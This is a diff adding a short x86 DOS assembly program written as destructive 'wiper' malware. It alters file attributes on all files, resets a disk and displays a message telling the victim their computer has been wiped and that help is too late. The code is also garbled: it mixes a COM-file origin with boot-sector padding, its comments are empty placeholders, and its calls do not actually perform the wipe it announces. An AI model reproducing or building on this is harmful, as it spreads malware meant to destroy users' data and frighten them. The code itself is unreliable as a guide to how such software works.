@@ -1,0 +1,35 @@
+ORG 100h
+
+start:
+    ; E
+    xor ax, ax
+    xor bx, bx
+    xor cx, cx
+    xor dx, dx
+    int 15h
+
+    ; E
+    mov ah, 43h
+    mov al, 1
+    mov dx, offset mask
+    int 21h
+
+    ; E
+    mov dl, 0
+    mov ah, 0
+    mov al, 2
+    int 13h
+
+    ; E
+    mov ah, 9
+    mov dx, offset message
+    int 21h
+
+    ; E
+    jmp $
+
+message db "Congratulations! Your computer has been completely wiped. Don't bother seeking help; it's too late!", 0
+mask db '*.*', 0
+
+times 510-($-$$) db 0
+dw 0AA55h
